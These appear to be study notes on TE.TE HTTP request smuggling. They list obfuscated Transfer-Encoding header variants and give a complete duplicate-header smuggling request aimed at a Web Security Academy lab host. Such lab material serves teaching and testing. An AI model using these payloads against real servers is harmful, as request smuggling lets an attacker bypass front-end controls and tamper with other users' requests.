# TE.TE Obfuscation

> Reference patterns from the request-smuggling study notes. Use only on authorized targets/labs.

TE.TE issues occur when both servers support `Transfer-Encoding`, but only one recognizes an obfuscated version.

## Header variations

```http
Transfer-Encoding: xchunked
```

```http
Transfer-Encoding : chunked
```

```http
Transfer-Encoding: chunked
Transfer-Encoding: x
```

Tab variation:

```text
Transfer-Encoding:[TAB]chunked
```

Leading-space variation:

```text
[SPACE]Transfer-Encoding: chunked
```

Embedded-header variation:

```text
X: X[\n]Transfer-Encoding: chunked
```

Split variation:

```text
Transfer-Encoding
: chunked
```

## Duplicate-header lab pattern

```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: cow

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

The goal in a lab is to identify a variation that one HTTP parser accepts while the other ignores.
